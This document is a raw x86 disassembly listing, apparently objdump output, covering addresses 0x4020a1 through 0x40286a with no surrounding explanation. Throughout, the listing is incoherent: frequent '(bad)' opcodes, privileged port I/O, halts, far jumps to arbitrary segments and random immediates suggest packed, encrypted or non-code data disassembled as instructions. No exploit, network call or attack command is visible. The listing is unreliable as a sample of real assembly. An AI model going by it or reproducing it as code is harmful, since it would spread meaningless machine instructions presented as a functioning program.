  4020a1:	pop    ss
  4020a2:	(bad)  
  4020a3:	push   esi
  4020a4:	int3   
  4020a5:	mov    al,0x36
  4020a7:	pop    ecx
  4020a8:	repnz xor BYTE PTR [bp+si-0x4681],al
  4020ae:	(bad)  
  4020af:	lock pop edx
  4020b1:	test   esi,esp
  4020b3:	aaa    
  4020b4:	or     bl,BYTE PTR [edi]
  4020b6:	js     0x40205f
  4020b8:	loop   0x4020fe
  4020ba:	add    BYTE PTR [ebx+edx*8],dh
  4020bd:	xor    al,0x6c
  4020bf:	jmp    DWORD PTR [edx]
  4020c1:	mov    esp,cs
  4020c3:	test   al,0x9a
  4020c5:	mov    esi,0x7b147793
  4020ca:	xor    BYTE PTR [ecx+0x3e41653e],dh
  4020d0:	nop
  4020d1:	retf   0x440d
  4020d4:	adc    esi,DWORD PTR [esi]
  4020d6:	adc    edi,DWORD PTR [edx]
  4020d8:	(bad)  
  4020db:	or     eax,0x31fc99b
  4020e0:	int3   
  4020e1:	loop   0x40213a
  4020e3:	sar    BYTE PTR [eax],1
  4020e5:	leave  
  4020e6:	mov    esp,0xa06b308e
  4020eb:	fdivp  st(1),st
  4020ed:	dec    ecx
  4020ee:	out    dx,eax
  4020ef:	push   ss
  4020f0:	xchg   esi,eax
  4020f1:	mov    DWORD PTR [edi],edi
  4020f3:	mov    ah,0x52
  4020f5:	pop    ecx
  4020f6:	xor    DWORD PTR ds:0x86826d7b,edi
  4020fc:	js     0x4020a5
  4020fe:	out    0xc8,eax
  402100:	inc    ebp
  402101:	and    BYTE PTR [ecx-0x25ca6393],dl
  402107:	inc    ebp
  402108:	jbe    0x40217b
  40210a:	sar    edx,cl
  40210c:	fld    DWORD PTR [edi-0x3cb4dbc4]
  402112:	pop    ss
  402113:	mov    edx,DWORD PTR [eax-0xa08346f]
  402119:	inc    ebx
  40211a:	bound  edx,QWORD PTR [eax]
  40211c:	jo     0x402185
  40211e:	jns    0x402101
  402120:	inc    eax
  402121:	ret    
  402122:	std    
  402123:	cmp    edx,ecx
  402125:	or     DWORD PTR [edi],edx
  402127:	ret    
  402128:	in     eax,dx
  402129:	adc    eax,0xf5241674
  40212e:	mov    WORD PTR [ebx-0x2e9b04ab],fs
  402134:	(bad)  
  402135:	aam    0xf7
  402137:	mov    ebp,0x592184fe
  40213c:	fst    DWORD PTR [esi]
  40213e:	(bad)  
  402140:	inc    ebx
  402141:	xlat   BYTE PTR ds:[ebx]
  402142:	sub    eax,0x17bb36c8
  402147:	xchg   DWORD PTR [ebp-0x32eb9cee],esi
  40214d:	mov    BYTE PTR [ecx-0x3986b454],dl
  402153:	loope  0x4020e4
  402155:	and    ebp,DWORD PTR [ebp-0x27fa356d]
  40215b:	(bad)  
  40215c:	out    0xb1,al
  40215e:	int3   
  40215f:	mov    dl,0x97
  402161:	in     eax,dx
  402162:	push   edi
  402163:	pop    ebp
  402164:	adc    eax,0xad0c7a56
  402169:	ss jns 0x40217b
  40216c:	icebp  
  40216d:	mov    ds:0x4fced9ff,eax
  402172:	fmul   QWORD PTR [ecx+ebx*2-0x8]
  402176:	jb     0x4021d7
  402178:	fst    st(4)
  40217a:	dec    ebx
  40217b:	sti    
  40217c:	fidivr DWORD PTR [esp+eax*8]
  40217f:	and    DWORD PTR [edi+0x7a22fa9f],edi
  402185:	(bad)  
  402186:	or     cl,BYTE PTR [edi]
  402188:	pop    ebx
  402189:	inc    esp
  40218a:	xchg   BYTE PTR [edi-0x67],bl
  40218d:	sbb    ebx,DWORD PTR [ecx]
  40218f:	and    bl,BYTE PTR ds:0x7ee1859c
  402195:	cli    
  402196:	retf   0xae11
  402199:	mov    ch,0xa3
  40219b:	lock jae 0x402206
  40219e:	sub    dl,BYTE PTR [edx+0x5b]
  4021a1:	sar    DWORD PTR [ecx+0x5b9dfd08],cl
  4021a7:	mov    esp,0x6821c79d
  4021ac:	out    0x6e,eax
  4021ae:	jne    0x4021d3
  4021b0:	cmc    
  4021b1:	lods   eax,DWORD PTR ds:[esi]
  4021b2:	and    DWORD PTR [eax],eax
  4021b4:	cmp    esp,DWORD PTR [eax+0x1d3611f]
  4021ba:	xchg   BYTE PTR [eax+0x32],dl
  4021bd:	shr    BYTE PTR [esi+0x66166f7b],0x41
  4021c4:	icebp  
  4021c5:	and    al,0x16
  4021c7:	ds ds mov ebp,0xb5462be3
  4021ce:	pop    edi
  4021cf:	add    BYTE PTR [eax+ecx*8+0xd16527],dl
  4021d6:	lock ins DWORD PTR es:[edi],dx
  4021d8:	ds xor al,0xdf
  4021db:	inc    esp
  4021dc:	sub    al,BYTE PTR ds:0xf5c91794
  4021e2:	xor    al,0x69
  4021e4:	loop   0x40225b
  4021e6:	inc    edi
  4021e7:	add    eax,0x660a95de
  4021ec:	ins    BYTE PTR es:[edi],dx
  4021ed:	mov    eax,ds:0xa48ca00a
  4021f2:	mov    eax,ds:0xd1341375
  4021f7:	mov    cl,0xda
  4021f9:	aad    0xc4
  4021fb:	inc    ecx
  4021fc:	jle    0x4021ba
  4021fe:	or     dh,BYTE PTR [eax]
  402200:	repz jmp 0x823e:0x5eeef3f6
  402208:	xchg   ebp,eax
  402209:	xchg   edx,eax
  40220a:	fiadd  WORD PTR [edx]
  40220c:	(bad)  
  40220d:	jge    0x4021ff
  40220f:	adc    al,0xf7
  402211:	mov    ebx,0xe2141abd
  402216:	mov    ebx,0xaa30a7c4
  40221b:	icebp  
  40221c:	dec    ecx
  40221d:	psllw  mm7,QWORD PTR [esi]
  402220:	mov    bl,0x1
  402222:	ins    DWORD PTR es:[edi],dx
  402223:	int3   
  402224:	sar    ebp,1
  402226:	xor    BYTE PTR [ebp-0x6014feb],dl
  40222c:	(bad)  
  40222d:	mov    dh,0x12
  40222f:	fdivr  QWORD PTR [esi-0x7f]
  402232:	cmp    DWORD PTR [ecx+eiz*8-0x1d],ebp
  402236:	retf   0xa1fd
  402239:	outs   dx,DWORD PTR ds:[esi]
  40223a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40223b:	add    bh,BYTE PTR [esi]
  40223d:	sub    eax,0xaae7983b
  402242:	pop    esp
  402243:	aas    
  402244:	ja     0x402296
  402246:	js     0x4021ed
  402248:	stos   BYTE PTR es:[edi],al
  402249:	mov    BYTE PTR [esi],ch
  40224b:	dec    esp
  40224c:	push   ss
  40224d:	retf   0x7bab
  402250:	mov    ecx,0xf5fa120f
  402255:	clc    
  402256:	push   eax
  402257:	cs jmp 0x4022a6
  40225a:	pop    esp
  40225b:	sub    al,0xa6
  40225d:	push   esi
  40225e:	lock test edx,ecx
  402261:	scas   al,BYTE PTR es:[edi]
  402262:	mov    BYTE PTR [edx+0x3],bh
  402265:	mov    ah,0xa0
  402267:	mov    esp,0x4f8317e8
  40226c:	sub    BYTE PTR [edx],ah
  40226e:	std    
  40226f:	xor    edi,DWORD PTR [ebx-0x6f02ceb0]
  402275:	sti    
  402276:	jmp    0x9f6a:0x2ea169d7
  40227d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40227e:	scas   eax,DWORD PTR es:[edi]
  40227f:	test   al,0x83
  402281:	neg    BYTE PTR [esi]
  402283:	add    eax,0x8336d512
  402288:	push   esi
  402289:	sub    ebp,ebp
  40228b:	ja     0x402221
  40228d:	pop    edi
  40228e:	or     cl,BYTE PTR [esi]
  402290:	ins    DWORD PTR es:[edi],dx
  402291:	imul   ebx,DWORD PTR [esi-0x72a66239],0x5
  402298:	and    al,0x18
  40229a:	jb     0x402229
  40229c:	adc    DWORD PTR [eax+eax*4+0x14be6caf],ebx
  4022a3:	test   al,0x25
  4022a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022a6:	les    ebx,FWORD PTR [eax+0x22]
  4022a9:	scas   al,BYTE PTR es:[edi]
  4022aa:	inc    esi
  4022ab:	inc    edx
  4022ac:	or     BYTE PTR [ebx-0x2ef60511],ah
  4022b2:	in     eax,dx
  4022b3:	out    0xf7,eax
  4022b5:	xlat   BYTE PTR ds:[ebx]
  4022b6:	fucomi st,st(1)
  4022b8:	stc    
  4022b9:	mov    bl,0xca
  4022bb:	mov    dl,0xa5
  4022bd:	xchg   esi,eax
  4022be:	call   0xf38069b6
  4022c3:	or     eax,0x5ed29339
  4022c8:	gs loope 0x402336
  4022cb:	mov    BYTE PTR [eax+edi*2+0x5d3953c9],bl
  4022d2:	repnz lods al,BYTE PTR ds:[esi]
  4022d4:	sbb    dl,BYTE PTR [edi-0x36]
  4022d7:	aam    0x37
  4022d9:	inc    ebp
  4022da:	ror    DWORD PTR [ecx],1
  4022dc:	mov    ds:0xd4feb004,eax
  4022e1:	clc    
  4022e2:	repz bound ecx,QWORD PTR [bp+si]
  4022e6:	mov    gs,WORD PTR ds:0x714e0c39
  4022ec:	mov    BYTE PTR [edi-0x9b40aa],bh
  4022f2:	xchg   ebp,eax
  4022f3:	jp     0x40229a
  4022f5:	xchg   edi,eax
  4022f6:	test   BYTE PTR [eax-0x14],bh
  4022f9:	pop    ecx
  4022fa:	sbb    ecx,DWORD PTR [ebx-0x2f39731b]
  402300:	ins    BYTE PTR es:[edi],dx
  402301:	mov    al,ds:0x77561463
  402306:	sub    dh,dl
  402308:	je     0x40237e
  40230a:	out    dx,eax
  40230b:	cmp    bl,bl
  40230d:	push   ecx
  40230e:	popa   
  40230f:	imul   esi,DWORD PTR [ecx],0x321f040e
  402315:	aad    0x8b
  402317:	push   es
  402318:	sub    ah,BYTE PTR [edi]
  40231a:	adc    eax,0x5de13d86
  40231f:	hlt    
  402320:	aad    0xfb
  402322:	push   0x21
  402324:	in     al,0x37
  402326:	js     0x4022cc
  402328:	mov    eax,ds:0xe892d7bb
  40232d:	ret    
  40232e:	adc    BYTE PTR [edx+0x41],cl
  402331:	lea    esp,[esi]
  402333:	bound  eax,QWORD PTR ds:0x93b54fb2
  402339:	add    eax,0xf1c65bf7
  40233e:	imul   edx,DWORD PTR [edx-0x7efc2bb3],0x31
  402345:	add    al,0xd
  402347:	imul   ecx,DWORD PTR [edx+0x50],0x7c
  40234b:	adc    ebx,DWORD PTR [edi-0x2233481e]
  402351:	add    dh,BYTE PTR [eax+0x620355ba]
  402357:	xchg   BYTE PTR [eax-0x2],dh
  40235a:	(bad)  
  40235b:	retf   
  40235c:	or     al,0x20
  40235e:	aaa    
  40235f:	cmc    
  402360:	hlt    
  402361:	dec    esi
  402362:	(bad)  
  402363:	ss pop edi
  402365:	pop    ecx
  402366:	ror    BYTE PTR [edx-0x5ae2a966],cl
  40236c:	or     edx,ebx
  40236e:	inc    ebx
  40236f:	jge    0x402344
  402371:	jb     0x4023ed
  402373:	adc    al,dh
  402375:	hlt    
  402376:	inc    esp
  402377:	pop    edx
  402378:	sbb    ch,0xa4
  40237b:	xlat   BYTE PTR ds:[ebx]
  40237c:	inc    edi
  40237d:	not    DWORD PTR [eax-0x23]
  402380:	push   ebx
  402381:	and    DWORD PTR [esi-0x3868a961],edi
  402387:	fdiv   QWORD PTR [esi-0x4a]
  40238a:	pushf  
  40238b:	dec    ecx
  40238c:	push   edi
  40238d:	popf   
  40238e:	pop    edi
  40238f:	cli    
  402390:	sub    ecx,ebx
  402392:	and    al,0xcd
  402394:	mov    fs,edx
  402396:	scas   eax,DWORD PTR es:[edi]
  402397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402398:	mov    dl,0xb3
  40239a:	stc    
  40239b:	outs   dx,DWORD PTR ds:[esi]
  40239c:	jmp    0x4023dd
  40239e:	dec    esp
  40239f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023a0:	sar    BYTE PTR [ebx],1
  4023a2:	push   ebx
  4023a3:	xchg   DWORD PTR [edi+ebp*4+0x19],ecx
  4023a7:	or     eax,0x97f2f6b2
  4023ac:	scas   al,BYTE PTR es:[edi]
  4023ad:	adc    ch,bh
  4023af:	lds    ebx,FWORD PTR [eiz*4-0x6dcb7fb5]
  4023b6:	xor    dl,BYTE PTR [eax+0x60]
  4023b9:	popa   
  4023ba:	(bad)  
  4023bb:	xchg   ebx,eax
  4023bc:	jns    0x40239b
  4023be:	add    bh,BYTE PTR [edi-0x2a29ad8e]
  4023c4:	sbb    eax,0x5fa6343c
  4023c9:	adc    DWORD PTR [ebx+0x2f7b0103],ebx
  4023cf:	dec    esp
  4023d1:	xchg   ecx,eax
  4023d2:	fidiv  DWORD PTR [ebx+0x147778ff]
  4023d8:	repnz ins BYTE PTR es:[edi],dx
  4023da:	retf   0x21f4
  4023dd:	dec    ecx
  4023de:	ins    BYTE PTR es:[edi],dx
  4023df:	mov    al,ds:0xb1fa3837
  4023e4:	sub    BYTE PTR [edx],cl
  4023e6:	aaa    
  4023e7:	aam    0xea
  4023e9:	dec    edx
  4023ea:	(bad)  
  4023eb:	pushf  
  4023ec:	call   0x6948:0x15b54a28
  4023f3:	push   ecx
  4023f4:	repz test al,0x23
  4023f7:	push   eax
  4023f8:	add    dl,BYTE PTR gs:[edx+ecx*1]
  4023fc:	sbb    DWORD PTR ds:0x42aeb889,ecx
  402402:	jle    0x4023ab
  402404:	jbe    0x4023ea
  402406:	loop   0x4023ac
  402408:	push   ebx
  402409:	dec    DWORD PTR [edx]
  40240b:	aam    0xd4
  40240d:	mov    ebx,es
  40240f:	icebp  
  402410:	jnp    0x402456
  402412:	mov    BYTE PTR [eax+0x653c7d2],ah
  402418:	fiadd  WORD PTR ds:0xbe24e75a
  40241e:	test   al,0x6e
  402420:	inc    eax
  402421:	ins    BYTE PTR es:[edi],dx
  402422:	imul   eax,DWORD PTR [ebp+eiz*8+0xe],0xffffffa8
  402427:	sbb    bh,BYTE PTR [ebx+0x6c6df8d1]
  40242d:	mov    esp,0xff04c6d4
  402432:	sahf   
  402433:	fwait
  402434:	push   esp
  402435:	imul   edi,DWORD PTR [ebx-0x31],0xbe9472fb
  40243c:	out    0x57,al
  40243e:	push   esp
  40243f:	fcom   DWORD PTR cs:[eax-0x3a682f30]
  402446:	adc    ch,BYTE PTR [edi+0x7e]
  402449:	neg    DWORD PTR [eax+0x22]
  40244c:	sbb    BYTE PTR [ecx],bh
  40244e:	dec    ebp
  40244f:	dec    ebp
  402450:	mov    edi,0xad146f4d
  402455:	or     eax,0x55528639
  40245a:	aad    0x11
  40245c:	lahf   
  40245d:	loope  0x402441
  40245f:	jbe    0x40242c
  402461:	sub    ebx,ecx
  402463:	out    dx,eax
  402464:	dec    eax
  402465:	int3   
  402466:	inc    eax
  402467:	mov    DWORD PTR ds:0x36944adc,esi
  40246e:	loop   0x402477
  402470:	clc    
  402471:	push   esp
  402472:	or     esp,DWORD PTR [edi]
  402474:	cdq    
  402475:	fistp  DWORD PTR ds:0x81301160
  40247c:	(bad)  
  40247d:	jg     0x4024c4
  40247f:	ja     0x40243d
  402481:	out    0x6d,al
  402483:	adc    ebp,DWORD PTR [edi-0x3]
  402486:	lock jnp 0x402450
  402489:	and    ecx,DWORD PTR [edx-0x24a42f85]
  40248f:	int    0xb8
  402491:	dec    eax
  402492:	fcom   QWORD PTR [esi-0x3ffddcdd]
  402498:	sub    ebx,DWORD PTR [ecx+0x3c]
  40249b:	loop   0x4024d5
  40249d:	in     al,dx
  40249e:	xor    DWORD PTR [edx+eax*4-0x3c4f3703],edx
  4024a5:	repz fisttp QWORD PTR ds:0x1679df56
  4024ac:	pop    ebp
  4024ad:	arpl   WORD PTR [edx+eax*2+0x16],di
  4024b1:	mov    edx,0x7614d652
  4024b6:	add    cl,BYTE PTR [ebx]
  4024b8:	retf   0xb70c
  4024bb:	dec    esp
  4024bc:	adc    ch,BYTE PTR [edi-0x471e70d5]
  4024c2:	mov    WORD PTR [esi+0x49cbdc1f],gs
  4024c8:	mov    ecx,0x5eae896b
  4024cd:	or     DWORD PTR [ebx],ebx
  4024cf:	inc    ecx
  4024d0:	ror    al,cl
  4024d2:	jecxz  0x40252d
  4024d4:	and    BYTE PTR [edi+0x20294cd8],0xf
  4024db:	and    edi,0x9ddedf72
  4024e1:	jo     0x40249c
  4024e3:	add    al,dh
  4024e5:	sbb    dh,bh
  4024e7:	mov    BYTE PTR [edi-0x17],dl
  4024ea:	pop    ecx
  4024eb:	pusha  
  4024ec:	std    
  4024ed:	das    
  4024ee:	push   ds
  4024ef:	jnp    0x402515
  4024f1:	mov    esi,DWORD PTR [ebx-0x2d]
  4024f4:	dec    edi
  4024f5:	dec    ebp
  4024f6:	push   esi
  4024f7:	rcl    DWORD PTR [ecx-0x54277b1],0x3e
  4024fe:	mov    dh,0xa2
  402500:	ins    BYTE PTR es:[edi],dx
  402501:	je     0x40250f
  402503:	add    eax,0xc8a38d98
  402508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402509:	add    ch,BYTE PTR [ecx-0x25e68ee0]
  40250f:	jns    0x4024ef
  402511:	rcr    DWORD PTR ds:0xaaa43f45,0xc0
  402518:	popa   
  402519:	xchg   esi,eax
  40251a:	dec    ebp
  40251b:	dec    ebp
  40251c:	and    ebp,DWORD PTR fs:[esi+ecx*8]
  402520:	xor    ecx,edx
  402522:	add    eax,0xd86d9c25
  402527:	mov    bh,0x9
  402529:	in     eax,0x88
  40252b:	mov    eax,0x6bc6c7d9
  402530:	inc    esi
  402531:	sub    ah,BYTE PTR [edi]
  402533:	xor    DWORD PTR [esi+0x79b79206],0xffffffc7
  40253a:	fsub   DWORD PTR [edi-0xe00991d]
  402540:	or     eax,0xe0a2eaff
  402545:	mov    edx,0xdff117c
  40254a:	add    DWORD PTR [esi-0x45],0xd4233112
  402551:	jo     0x4025ce
  402553:	sbb    ebx,esi
  402555:	and    cl,BYTE PTR ds:0xb77e525d
  40255b:	adc    eax,0xd3f0e9ed
  402560:	(bad)  
  402561:	pop    ebx
  402562:	je     0x402528
  402564:	push   ecx
  402565:	pop    esp
  402566:	mov    DWORD PTR [esi+0x7dc4d4bf],ecx
  40256c:	cli    
  40256d:	and    bl,bh
  40256f:	sbb    DWORD PTR [edx],edx
  402571:	bound  eax,QWORD PTR [esi-0x30]
  402574:	bound  edi,QWORD PTR [edi*2-0x5f7c8061]
  40257b:	ins    DWORD PTR es:[edi],dx
  40257c:	lock aad 0x3e
  40257f:	push   0x68
  402581:	and    BYTE PTR [esi],al
  402583:	or     eax,0xd5497d5d
  402588:	sub    DWORD PTR [ebx+0x7f],0xffffffcb
  40258c:	pop    eax
  40258d:	(bad)  
  40258e:	add    al,0x7c
  402590:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402592:	adc    dh,0x42
  402595:	pop    edx
  402596:	pop    es
  402597:	mov    dl,0x45
  402599:	inc    esi
  40259a:	push   ss
  40259b:	fwait
  40259c:	add    DWORD PTR [esp+esi*1],ebx
  40259f:	fsubp  st(6),st
  4025a1:	inc    esp
  4025a2:	add    cl,al
  4025a4:	inc    edi
  4025a5:	cmp    bl,BYTE PTR [edi]
  4025a7:	sbb    BYTE PTR [eax-0x1e],0x66
  4025ab:	scas   al,BYTE PTR es:[edi]
  4025ac:	call   0x7cf39d27
  4025b1:	adc    eax,0x93eba98c
  4025b6:	sti    
  4025b7:	push   edi
  4025b8:	sti    
  4025b9:	xchg   esp,eax
  4025ba:	(bad)  
  4025bb:	and    BYTE PTR [esi],ch
  4025bd:	cmp    BYTE PTR ds:0xb6845d83,bl
  4025c3:	pop    esi
  4025c4:	(bad)
  4025c9:	xor    dl,bl
  4025cb:	sub    eax,0x4e2c2164
  4025d0:	inc    edi
  4025d1:	test   DWORD PTR [esi-0x6a2fb052],ecx
  4025d7:	fld    QWORD PTR [ebx]
  4025d9:	push   eax
  4025da:	std    
  4025db:	hlt    
  4025dc:	pop    ebp
  4025dd:	mov    edi,0x3010d0ab
  4025e2:	hlt    
  4025e3:	lods   eax,DWORD PTR ds:[esi]
  4025e4:	aam    0xad
  4025e6:	push   ebp
  4025e7:	pop    ds
  4025e8:	les    esp,FWORD PTR [edx+ebx*2+0x1b5036d6]
  4025ef:	ins    DWORD PTR es:[edi],dx
  4025f0:	inc    esp
  4025f1:	scas   al,BYTE PTR es:[edi]
  4025f2:	outs   dx,BYTE PTR ds:[esi]
  4025f3:	dec    edi
  4025f4:	shl    DWORD PTR [ecx],cl
  4025f6:	lock pop ebp
  4025f8:	push   0x36
  4025fa:	jle    0x40265a
  4025fc:	mov    ebp,0x637c8b2e
  402601:	iret   
  402602:	loope  0x40258a
  402604:	in     eax,dx
  402605:	iret   
  402606:	push   ebp
  402607:	arpl   WORD PTR [ebx],si
  402609:	push   ds
  40260a:	pushf  
  40260b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40260c:	push   ds
  40260d:	adc    DWORD PTR [ebp-0x5f],esp
  402610:	xchg   ebp,eax
  402611:	arpl   WORD PTR [ecx+0x26],si
  402614:	out    dx,eax
  402615:	sub    ah,BYTE PTR [esi+0x209160f5]
  40261b:	(bad)  
  40261c:	dec    edi
  40261d:	retf   0x8a14
  402620:	mov    esi,0x2e8fde70
  402625:	dec    ebx
  402626:	sub    al,0x54
  402628:	imul   ecx,DWORD PTR [ecx],0x62f740c6
  40262e:	loop   0x402648
  402630:	icebp  
  402631:	cwde   
  402632:	mov    esi,0xfe73fb38
  402637:	mov    bh,0x13
  402639:	ficomp DWORD PTR [ecx]
  40263b:	into   
  40263c:	outs   dx,BYTE PTR ds:[esi]
  40263d:	(bad)  
  40263e:	xchg   edi,eax
  40263f:	std    
  402640:	mov    BYTE PTR [ebx+0x20],dh
  402643:	mov    ds,WORD PTR [edx]
  402645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402646:	rcr    BYTE PTR ds:0x360aad97,0x6a
  40264d:	sub    al,0xdd
  40264f:	stos   DWORD PTR es:[edi],eax
  402650:	push   ecx
  402651:	iret   
  402652:	ins    DWORD PTR es:[edi],dx
  402653:	call   0x14fe03d6
  402658:	add    DWORD PTR [ebx+0x26b44995],0xffffffcc
  40265f:	dec    ecx
  402660:	cmp    DWORD PTR [esi],esp
  402662:	psllq  mm1,mm4
  402665:	outs   dx,BYTE PTR ds:[esi]
  402666:	rol    DWORD PTR [esi],1
  402668:	stos   BYTE PTR es:[edi],al
  402669:	imul   eax,DWORD PTR fs:[ebp+0x29],0x65
  40266e:	(bad)
  402671:	scas   al,BYTE PTR es:[edi]
  402672:	div    DWORD PTR [esi+0x574781c7]
  402678:	enter  0xf28e,0xfa
  40267c:	mov    ebx,0x823af34
  402681:	fldcw  WORD PTR [esi-0x6fbcaa66]
  402687:	dec    ebp
  402688:	pusha  
  402689:	and    BYTE PTR [edi-0x6305fc03],0x78
  402690:	std    
  402691:	pop    ecx
  402692:	jno    0x40266a
  402694:	push   0x52
  402696:	daa    
  402697:	aas    
  402698:	outs   dx,DWORD PTR ds:[esi]
  402699:	dec    edx
  40269a:	sahf   
  40269b:	mov    esi,DWORD PTR cs:[esi+0x2c]
  40269f:	fwait
  4026a0:	in     eax,dx
  4026a1:	out    0x6c,eax
  4026a3:	js     0x4026b4
  4026a5:	jmp    0xfd1c:0x5a241ba5
  4026ac:	shr    cl,0x1c
  4026af:	ret    0xa86c
  4026b2:	inc    ecx
  4026b3:	idiv   DWORD PTR [edi]
  4026b5:	xchg   esp,eax
  4026b6:	jg     0x4026c5
  4026b8:	lock xor al,0xc2
  4026bb:	es push edi
  4026bd:	mov    WORD PTR [edx],gs
  4026bf:	addr16 aaa 
  4026c1:	pop    esp
  4026c2:	xchg   edx,eax
  4026c3:	jbe    0x4026a1
  4026c5:	test   DWORD PTR [edi*4-0x8c5f78f],ebp
  4026cc:	xor    DWORD PTR [edx],edi
  4026ce:	sub    eax,0xea537a1e
  4026d3:	xor    dh,BYTE PTR [edx-0x7c]
  4026d6:	pushf  
  4026d7:	popa   
  4026d8:	jmp    0xecad:0x7e6bd82
  4026df:	mov    edx,DWORD PTR [ecx+0x27]
  4026e2:	sub    BYTE PTR [eax-0xb],ah
  4026e5:	cmc    
  4026e6:	mov    dh,0xee
  4026e8:	xor    BYTE PTR [ebp+0x1c],0xf5
  4026ec:	add    eax,0x94362b33
  4026f1:	cli    
  4026f2:	pop    edx
  4026f3:	push   ebp
  4026f4:	jecxz  0x4026af
  4026f6:	fistp  WORD PTR [eax+0x58]
  4026f9:	lods   eax,DWORD PTR ds:[esi]
  4026fa:	jp     0x402735
  4026fc:	pop    esi
  4026fd:	fstp   TBYTE PTR [edx-0x74dde400]
  402703:	sahf   
  402704:	ret    0xb82
  402707:	dec    ecx
  402708:	push   eax
  402709:	test   BYTE PTR [eax],bh
  40270b:	test   DWORD PTR [eax],edx
  40270d:	imul   edx,DWORD PTR ds:0xf4ced3d2,0x97241d5a
  402717:	sub    esi,ebp
  402719:	out    0xf3,eax
  40271b:	add    BYTE PTR [edi-0xf],cl
  40271e:	aad    0xf9
  402720:	adc    BYTE PTR [bx+di],bl
  402723:	push   ebx
  402724:	jae    0x4026cd
  402726:	cmp    esp,DWORD PTR [ecx]
  402728:	test   DWORD PTR [ebp+edx*2-0x1a02840],0x17e31f72
  402733:	shr    BYTE PTR [eax-0x269674ca],1
  402739:	aam    0x49
  40273b:	leave  
  40273c:	xchg   edi,eax
  40273d:	mov    ch,0x2b
  40273f:	sub    al,0x7c
  402741:	ds aas 
  402743:	bnd ja 0x402723
  402746:	imul   esi,DWORD PTR [esi+0x60],0xffffff84
  40274a:	adc    al,0xe7
  40274c:	mov    bl,bh
  40274e:	out    dx,al
  40274f:	sbb    ecx,esi
  402751:	retf   
  402752:	jecxz  0x40278f
  402754:	ss pop edi
  402756:	jo     0x402724
  402758:	push   edi
  402759:	pop    eax
  40275a:	fwait
  40275b:	push   edi
  40275c:	push   es
  40275d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40275e:	int    0xb0
  402760:	sub    bl,BYTE PTR [edx*4+0x67311c3e]
  402767:	mov    ds:0xe5daeb53,eax
  40276c:	stos   DWORD PTR es:[edi],eax
  40276d:	das    
  40276e:	cmc    
  40276f:	xchg   edx,esp
  402771:	jp     0x40272d
  402773:	(bad)  
  402774:	adc    eax,0x92ee0038
  402779:	pop    edx
  40277a:	dec    eax
  40277b:	cs jecxz 0x402749
  40277e:	in     eax,0x56
  402780:	sub    BYTE PTR [ebx-0x4fd0bf6c],cl
  402786:	cmp    eax,0xbcebb630
  40278b:	in     al,dx
  40278c:	mov    ebp,DWORD PTR [edi-0xf3acb63]
  402792:	out    dx,eax
  402793:	pop    ebx
  402794:	stos   DWORD PTR es:[edi],eax
  402795:	mov    ch,0x81
  402797:	in     al,0x10
  402799:	dec    ecx
  40279a:	lea    ecx,[ebx+0x2f]
  40279d:	cli    
  40279e:	out    0x8b,eax
  4027a0:	data16 loop 0x402748
  4027a3:	mov    ch,0x1a
  4027a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027a6:	enter  0x6706,0xd8
  4027aa:	loopne 0x402751
  4027ac:	(bad)  
  4027ad:	call   FWORD PTR [ecx]
  4027af:	fisub  WORD PTR [ebp+0x14]
  4027b2:	iret   
  4027b3:	fwait
  4027b4:	clc    
  4027b5:	loopne 0x40273d
  4027b7:	add    bh,ch
  4027b9:	push   esi
  4027ba:	stc    
  4027bb:	(bad)  
  4027bc:	cld    
  4027bd:	cdq    
  4027be:	mov    dl,BYTE PTR [ebx-0x63]
  4027c1:	call   0x1e278e13
  4027c6:	pop    ds
  4027c7:	cdq    
  4027c8:	shl    DWORD PTR [esi],cl
  4027ca:	addr16 mov ecx,0xd3b46f89
  4027d0:	xchg   esp,eax
  4027d1:	jne    0x4027ad
  4027d3:	ds mov eax,0x427675e1
  4027d9:	cmp    DWORD PTR [edi+0x12e4168],eax
  4027df:	rol    DWORD PTR [edi-0x15],1
  4027e2:	in     eax,0x10
  4027e4:	test   bh,ah
  4027e6:	retf   
  4027e7:	push   ds
  4027e8:	adc    al,0x5c
  4027ea:	mov    esp,0x50d45d11
  4027ef:	xchg   ebx,eax
  4027f0:	stos   BYTE PTR es:[edi],al
  4027f1:	xor    al,0x9d
  4027f3:	cdq    
  4027f4:	mov    DWORD PTR [edx-0x7c],ecx
  4027f7:	(bad)  
  4027f8:	lahf   
  4027f9:	jne    0x40282a
  4027fb:	(bad)  
  4027fc:	shl    DWORD PTR [ecx+esi*8-0x15],1
  402800:	jg     0x4027f5
  402802:	adc    eax,0x3df1ebc4
  402807:	retf   0xd7fe
  40280a:	shr    BYTE PTR [ecx-0x38fee101],cl
  402810:	mov    ds:0xd3a742e3,al
  402815:	inc    ebx
  402816:	js     0x4027af
  402818:	retf   
  402819:	pop    ss
  40281a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40281b:	fisttp QWORD PTR ds:0x5cfc17f8
  402821:	ret    
  402822:	jno    0x40288f
  402824:	mov    cl,0xa5
  402826:	xor    ebp,DWORD PTR [eax+0xb134cd6]
  40282c:	add    al,0x67
  40282e:	adc    BYTE PTR [edi+ebx*2+0x390c0e4e],dl
  402835:	bound  ebx,QWORD PTR [esi+edx*8-0xc]
  402839:	add    DWORD PTR [edi],0x6b293589
  40283f:	fisubr WORD PTR [edi-0x7]
  402842:	scas   al,BYTE PTR es:[edi]
  402843:	imul   eax,DWORD PTR [edi+edx*2-0x29],0xffffff95
  402848:	(bad)  
  402849:	mul    DWORD PTR [ecx+ebx*1-0x9]
  40284d:	mov    edi,ebp
  40284f:	cli    
  402850:	stos   DWORD PTR es:[edi],eax
  402851:	repz icebp 
  402853:	push   esp
  402854:	mov    dl,0xbc
  402856:	push   es
  402857:	mov    dl,0xa0
  402859:	jnp    0x402847
  40285b:	imul   esp,esi,0x3f2305c4
  402861:	cmp    BYTE PTR [esp+edi*1-0x66],dl
  402865:	aaa    
  402866:	jo     0x402878
  402868:	mov    bl,0xd1
  40286a:	inc    ecx
